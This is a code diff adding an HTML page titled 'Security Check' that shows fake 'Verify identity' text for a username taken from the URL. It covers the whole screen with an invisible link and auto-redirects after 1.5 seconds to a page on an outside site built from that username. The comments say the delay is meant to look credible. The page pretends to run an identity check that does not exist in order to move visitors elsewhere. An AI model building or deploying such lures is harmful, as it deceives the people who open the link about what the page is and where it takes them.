@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Security Check</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<style>
+  /* Убираем отступы */
+  body, html { margin: 0; padding: 0; height: 100%; overflow: hidden; background-color: #ffffff; }
+  
+  /* Стиль оверлея - прозрачная ссылка на весь экран */
+  .link-overlay {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    z-index: 9999;
+    cursor: pointer;
+    background: rgba(0,0,0,0); 
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    text-decoration: none;
+  }
+
+  /* Текст по центру */
+  .center-text {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    font-size: 18px; 
+    color: #5f6368; /* Цвет текста как у гугла серый */
+    opacity: 0.7;
+    text-align: center;
+  }
+</style>
+</head>
+<body>
+
+<!-- Ссылка, которая растянута на весь экран -->
+<a id="dynamic-link" href="#" class="link-overlay">
+   <span class="center-text">
+     Verify identity for <b id="username-display">user</b>...<br>
+     <span style="font-size: 14px; opacity: 0.5;">(Tap anywhere to continue)</span>
+   </span>
+</a>
+
+<script>
+    // 1. Получаем параметр user из ссылки (например ?user=xSNYPSx777)
+    const queryString = window.location.search;
+    const urlParams = new URLSearchParams(queryString);
+    const user = urlParams.get('user');
+
+    // Базовая ссылка (если юзер не указан)
+    let finalUrl = "https://universelscammerlists.com/";
+
+    // 2. Если параметр user есть - формируем нужную ссылку
+    if (user) {
+        // Формируем: https://universelscammerlists.com/user/xSNYPSx777.php
+        finalUrl = "https://universelscammerlists.com/user/" + user + ".php";
+        
+        // Для красоты показываем ник на экране
+        document.getElementById('username-display').textContent = user;
+    } else {
+        document.getElementById('username-display').textContent = "Unknown";
+    }
+
+    // 3. Вставляем эту ссылку в наш "невидимый" блок
+    document.getElementById('dynamic-link').href = finalUrl;
+
+    // 4. (ОПЦИОНАЛЬНО) Пытаемся сделать авто-редирект
+    // Сработает не везде, но попробовать стоит
+    setTimeout(function() {
+       window.location.replace(finalUrl);
+    }, 1500); // Задержка 1.5 сек для солидности
+
+</script>
+
+</body>
+</html>
